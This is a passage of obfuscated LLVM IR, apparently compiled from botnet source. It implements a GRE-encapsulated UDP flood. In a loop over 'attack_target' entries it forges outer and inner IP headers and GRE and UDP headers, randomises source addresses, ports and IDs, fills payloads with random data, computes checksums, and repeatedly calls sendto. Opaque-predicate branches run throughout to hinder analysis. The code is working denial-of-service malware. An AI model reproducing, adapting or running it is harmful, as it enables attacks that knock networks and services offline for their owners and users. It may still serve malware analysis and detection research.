  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %609

; <label>:103:                                    ; preds = %79
  store i32 0, i32* %9, align 4
  br label %104

; <label>:104:                                    ; preds = %286, %103
  %105 = load i32, i32* %9, align 4
  %106 = load i8, i8* %5, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %289

; <label>:109:                                    ; preds = %104
  %110 = load i32, i32* @x.19
  %111 = load i32, i32* @y.20
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %109
  %118 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  store i8* %118, i8** %122, align 8
  %123 = load i8**, i8*** %11, align 8
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  %127 = load i8*, i8** %126, align 8
  %128 = bitcast i8* %127 to %struct.iphdr*
  store %struct.iphdr* %128, %struct.iphdr** %22, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i64 1
  %131 = bitcast %struct.iphdr* %130 to %struct.grehdr*
  store %struct.grehdr* %131, %struct.grehdr** %23, align 8
  %132 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %133 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %132, i64 1
  %134 = bitcast %struct.grehdr* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %24, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.udphdr*
  store %struct.udphdr* %137, %struct.udphdr** %25, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, 15
  %142 = or i8 %141, 64
  store i8 %142, i8* %139, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = and i8 %145, -16
  %147 = or i8 %146, 5
  store i8 %147, i8* %144, align 4
  %148 = load i8, i8* %12, align 1
  %149 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 1
  store i8 %148, i8* %150, align 1
  %151 = load i32, i32* %18, align 4
  %152 = sext i32 %151 to i64
  %153 = add i64 52, %152
  %154 = trunc i64 %153 to i16
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 2
  store i16 %155, i16* %157, align 2
  %158 = load i16, i16* %13, align 2
  %159 = call zeroext i16 @htons(i16 zeroext %158) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 3
  store i16 %159, i16* %161, align 4
  %162 = load i8, i8* %14, align 1
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 5
  store i8 %162, i8* %164, align 4
  %165 = load i8, i8* %15, align 1
  %166 = icmp ne i8 %165, 0
  %167 = load i32, i32* @x.19
  %168 = load i32, i32* @y.20
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart222, label %originalBB1alteredBB

originalBBpart222:                                ; preds = %originalBB1
  br i1 %166, label %175, label %179

; <label>:175:                                    ; preds = %originalBBpart222
  %176 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 4
  store i16 %176, i16* %178, align 2
  br label %179

; <label>:179:                                    ; preds = %175, %originalBBpart222
  %180 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 6
  store i8 47, i8* %181, align 1
  %182 = load i32, i32* %21, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 8
  store i32 %182, i32* %184, align 4
  %185 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %186 = load i32, i32* %9, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i64 %187
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i32 0, i32 1
  %190 = load i32, i32* %189, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 9
  store i32 %190, i32* %192, align 4
  %193 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %194 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %195 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %197 = bitcast %struct.iphdr* %196 to i8*
  %198 = load i8, i8* %197, align 4
  %199 = and i8 %198, 15
  %200 = or i8 %199, 64
  store i8 %200, i8* %197, align 4
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = bitcast %struct.iphdr* %201 to i8*
  %203 = load i8, i8* %202, align 4
  %204 = and i8 %203, -16
  %205 = or i8 %204, 5
  store i8 %205, i8* %202, align 4
  %206 = load i8, i8* %12, align 1
  %207 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 1
  store i8 %206, i8* %208, align 1
  %209 = load i32, i32* %18, align 4
  %210 = sext i32 %209 to i64
  %211 = add i64 28, %210
  %212 = trunc i64 %211 to i16
  %213 = call zeroext i16 @htons(i16 zeroext %212) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 2
  store i16 %213, i16* %215, align 2
  %216 = load i16, i16* %13, align 2
  %217 = zext i16 %216 to i32
  %218 = xor i32 %217, -1
  %219 = trunc i32 %218 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 3
  store i16 %220, i16* %222, align 4
  %223 = load i8, i8* %14, align 1
  %224 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 5
  store i8 %223, i8* %225, align 4
  %226 = load i8, i8* %15, align 1
  %227 = icmp ne i8 %226, 0
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %179
  %229 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %230 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 4
  store i16 %229, i16* %231, align 2
  br label %232

; <label>:232:                                    ; preds = %228, %179
  %233 = load i32, i32* @x.19
  %234 = load i32, i32* @y.20
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %232
  %241 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 6
  store i8 17, i8* %242, align 1
  %243 = call i32 @rand_next()
  %244 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %246 = load i8, i8* %20, align 1
  %247 = icmp ne i8 %246, 0
  %248 = load i32, i32* @x.19
  %249 = load i32, i32* @y.20
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %247, label %256, label %262

; <label>:256:                                    ; preds = %originalBBpart226
  %257 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 9
  %259 = load i32, i32* %258, align 4
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 9
  store i32 %259, i32* %261, align 4
  br label %270

; <label>:262:                                    ; preds = %originalBBpart226
  %263 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 8
  %265 = load i32, i32* %264, align 4
  %266 = sub i32 %265, 1024
  %267 = xor i32 %266, -1
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  br label %270

; <label>:270:                                    ; preds = %262, %256
  %271 = load i16, i16* %16, align 2
  %272 = call zeroext i16 @htons(i16 zeroext %271) #7
  %273 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i32 0, i32 0
  store i16 %272, i16* %274, align 2
  %275 = load i16, i16* %17, align 2
  %276 = call zeroext i16 @htons(i16 zeroext %275) #7
  %277 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %278 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %277, i32 0, i32 1
  store i16 %276, i16* %278, align 2
  %279 = load i32, i32* %18, align 4
  %280 = sext i32 %279 to i64
  %281 = add i64 8, %280
  %282 = trunc i64 %281 to i16
  %283 = call zeroext i16 @htons(i16 zeroext %282) #7
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 2
  store i16 %283, i16* %285, align 2
  br label %286

; <label>:286:                                    ; preds = %270
  %287 = load i32, i32* %9, align 4
  %288 = add nsw i32 %287, 1
  store i32 %288, i32* %9, align 4
  br label %104

; <label>:289:                                    ; preds = %104
  br label %290

; <label>:290:                                    ; preds = %originalBBpart261, %289
  %291 = load i32, i32* @x.19
  %292 = load i32, i32* @y.20
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %290
  store i32 0, i32* %9, align 4
  %299 = load i32, i32* @x.19
  %300 = load i32, i32* @y.20
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %307

; <label>:307:                                    ; preds = %589, %originalBBpart230
  %308 = load i32, i32* %9, align 4
  %309 = load i8, i8* %5, align 1
  %310 = zext i8 %309 to i32
  %311 = icmp slt i32 %308, %310
  br i1 %311, label %312, label %592

; <label>:312:                                    ; preds = %307
  %313 = load i32, i32* @x.19
  %314 = load i32, i32* @y.20
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %312
  %321 = load i8**, i8*** %11, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i8*, i8** %321, i64 %323
  %325 = load i8*, i8** %324, align 8
  store i8* %325, i8** %26, align 8
  %326 = load i8*, i8** %26, align 8
  %327 = bitcast i8* %326 to %struct.iphdr*
  store %struct.iphdr* %327, %struct.iphdr** %27, align 8
  %328 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i64 1
  %330 = bitcast %struct.iphdr* %329 to %struct.grehdr*
  store %struct.grehdr* %330, %struct.grehdr** %28, align 8
  %331 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %332 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %331, i64 1
  %333 = bitcast %struct.grehdr* %332 to %struct.iphdr*
  store %struct.iphdr* %333, %struct.iphdr** %29, align 8
  %334 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i64 1
  %336 = bitcast %struct.iphdr* %335 to %struct.udphdr*
  store %struct.udphdr* %336, %struct.udphdr** %30, align 8
  %337 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %338 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %337, i64 1
  %339 = bitcast %struct.udphdr* %338 to i8*
  store i8* %339, i8** %31, align 8
  %340 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %341 = load i32, i32* %9, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %340, i64 %342
  %344 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %343, i32 0, i32 2
  %345 = load i8, i8* %344, align 4
  %346 = zext i8 %345 to i32
  %347 = icmp slt i32 %346, 32
  %348 = load i32, i32* @x.19
  %349 = load i32, i32* @y.20
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %347, label %356, label %377

; <label>:356:                                    ; preds = %originalBBpart234
  %357 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i32 0, i32 1
  %362 = load i32, i32* %361, align 4
  %363 = call i32 @ntohl(i32 %362) #7
  %364 = call i32 @rand_next()
  %365 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i32 0, i32 2
  %370 = load i8, i8* %369, align 4
  %371 = zext i8 %370 to i32
  %372 = lshr i32 %364, %371
  %373 = add i32 %363, %372
  %374 = call i32 @htonl(i32 %373) #7
  %375 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 9
  store i32 %374, i32* %376, align 4
  br label %377

; <label>:377:                                    ; preds = %356, %originalBBpart234
  %378 = load i32, i32* @x.19
  %379 = load i32, i32* @y.20
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %377
  %386 = load i32, i32* %21, align 4
  %387 = icmp eq i32 %386, -1
  %388 = load i32, i32* @x.19
  %389 = load i32, i32* @y.20
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %387, label %396, label %400

; <label>:396:                                    ; preds = %originalBBpart238
  %397 = call i32 @rand_next()
  %398 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 8
  store i32 %397, i32* %399, align 4
  br label %400

; <label>:400:                                    ; preds = %396, %originalBBpart238
  %401 = load i32, i32* @x.19
  %402 = load i32, i32* @y.20
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %400
  %409 = load i16, i16* %13, align 2
  %410 = zext i16 %409 to i32
  %411 = icmp eq i32 %410, 65535
  %412 = load i32, i32* @x.19
  %413 = load i32, i32* @y.20
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %411, label %420, label %435

; <label>:420:                                    ; preds = %originalBBpart242
  %421 = call i32 @rand_next()
  %422 = and i32 %421, 65535
  %423 = trunc i32 %422 to i16
  %424 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 3
  store i16 %423, i16* %425, align 4
  %426 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 3
  %428 = load i16, i16* %427, align 4
  %429 = zext i16 %428 to i32
  %430 = sub nsw i32 %429, 1000
  %431 = xor i32 %430, -1
  %432 = trunc i32 %431 to i16
  %433 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 3
  store i16 %432, i16* %434, align 4
  br label %435

; <label>:435:                                    ; preds = %420, %originalBBpart242
  %436 = load i16, i16* %16, align 2
  %437 = zext i16 %436 to i32
  %438 = icmp eq i32 %437, 65535
  br i1 %438, label %439, label %445

; <label>:439:                                    ; preds = %435
  %440 = call i32 @rand_next()
  %441 = and i32 %440, 65535
  %442 = trunc i32 %441 to i16
  %443 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %444 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %443, i32 0, i32 0
  store i16 %442, i16* %444, align 2
  br label %445

; <label>:445:                                    ; preds = %439, %435
  %446 = load i32, i32* @x.19
  %447 = load i32, i32* @y.20
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %445
  %454 = load i16, i16* %17, align 2
  %455 = zext i16 %454 to i32
  %456 = icmp eq i32 %455, 65535
  %457 = load i32, i32* @x.19
  %458 = load i32, i32* @y.20
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %456, label %465, label %487

; <label>:465:                                    ; preds = %originalBBpart246
  %466 = load i32, i32* @x.19
  %467 = load i32, i32* @y.20
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %465
  %474 = call i32 @rand_next()
  %475 = and i32 %474, 65535
  %476 = trunc i32 %475 to i16
  %477 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %478 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %477, i32 0, i32 1
  store i16 %476, i16* %478, align 2
  %479 = load i32, i32* @x.19
  %480 = load i32, i32* @y.20
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart253, label %originalBB48alteredBB

originalBBpart253:                                ; preds = %originalBB48
  br label %487

; <label>:487:                                    ; preds = %originalBBpart253, %originalBBpart246
  %488 = load i8, i8* %20, align 1
  %489 = icmp ne i8 %488, 0
  br i1 %489, label %494, label %490

; <label>:490:                                    ; preds = %487
  %491 = call i32 @rand_next()
  %492 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 9
  store i32 %491, i32* %493, align 4
  br label %516

; <label>:494:                                    ; preds = %487
  %495 = load i32, i32* @x.19
  %496 = load i32, i32* @y.20
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %494
  %503 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 9
  %505 = load i32, i32* %504, align 4
  %506 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 9
  store i32 %505, i32* %507, align 4
  %508 = load i32, i32* @x.19
  %509 = load i32, i32* @y.20
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %516

; <label>:516:                                    ; preds = %originalBBpart257, %490
  %517 = load i8, i8* %19, align 1
  %518 = icmp ne i8 %517, 0
  br i1 %518, label %519, label %522

; <label>:519:                                    ; preds = %516
  %520 = load i8*, i8** %31, align 8
  %521 = load i32, i32* %18, align 4
  call void @rand_str(i8* %520, i32 %521)
  br label %522

; <label>:522:                                    ; preds = %519, %516
  %523 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 7
  store i16 0, i16* %524, align 2
  %525 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %526 = bitcast %struct.iphdr* %525 to i16*
  %527 = call zeroext i16 @checksum_generic(i16* %526, i32 20)
  %528 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 7
  store i16 %527, i16* %529, align 2
  %530 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 7
  store i16 0, i16* %531, align 2
  %532 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %533 = bitcast %struct.iphdr* %532 to i16*
  %534 = call zeroext i16 @checksum_generic(i16* %533, i32 20)
  %535 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 7
  store i16 %534, i16* %536, align 2
  %537 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %538 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %537, i32 0, i32 3
  store i16 0, i16* %538, align 2
  %539 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %540 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %541 = bitcast %struct.udphdr* %540 to i8*
  %542 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %543 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %542, i32 0, i32 2
  %544 = load i16, i16* %543, align 2
  %545 = load i32, i32* %18, align 4
  %546 = sext i32 %545 to i64
  %547 = add i64 8, %546
  %548 = trunc i64 %547 to i32
  %549 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %539, i8* %541, i16 zeroext %544, i32 %548)
  %550 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %551 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %550, i32 0, i32 3
  store i16 %549, i16* %551, align 2
  %552 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %553 = load i32, i32* %9, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %552, i64 %554
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i32 0, i32 0
  %557 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %556, i32 0, i32 0
  store i16 2, i16* %557, align 4
  %558 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %559 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %558, i32 0, i32 9
  %560 = load i32, i32* %559, align 4
  %561 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %562 = load i32, i32* %9, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %561, i64 %563
  %565 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %564, i32 0, i32 0
  %566 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %565, i32 0, i32 2
  %567 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %566, i32 0, i32 0
  store i32 %560, i32* %567, align 4
  %568 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %569 = load i32, i32* %9, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %572, i32 0, i32 1
  store i16 0, i16* %573, align 2
  %574 = load i32, i32* %10, align 4
  %575 = load i8*, i8** %26, align 8
  %576 = load i32, i32* %18, align 4
  %577 = sext i32 %576 to i64
  %578 = add i64 52, %577
  %579 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %580 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %581 = load i32, i32* %9, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %580, i64 %582
  %584 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i32 0, i32 0
  %585 = bitcast %struct.sockaddr_in* %584 to %struct.sockaddr*
  store %struct.sockaddr* %585, %struct.sockaddr** %579, align 8
  %586 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %587 = load %struct.sockaddr*, %struct.sockaddr** %586, align 8
  %588 = call i64 @sendto(i32 %574, i8* %575, i64 %578, i32 16384, %struct.sockaddr* %587, i32 16)
  br label %589

; <label>:589:                                    ; preds = %522
  %590 = load i32, i32* %9, align 4
  %591 = add nsw i32 %590, 1
  store i32 %591, i32* %9, align 4
  br label %307

; <label>:592:                                    ; preds = %307
  %593 = load i32, i32* @x.19
  %594 = load i32, i32* @y.20
  %595 = sub i32 %593, 1
  %596 = mul i32 %593, %595
  %597 = urem i32 %596, 2
  %598 = icmp eq i32 %597, 0
  %599 = icmp slt i32 %594, 10
  %600 = or i1 %598, %599
  br i1 %600, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %592
  %601 = load i32, i32* @x.19
  %602 = load i32, i32* @y.20
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %290

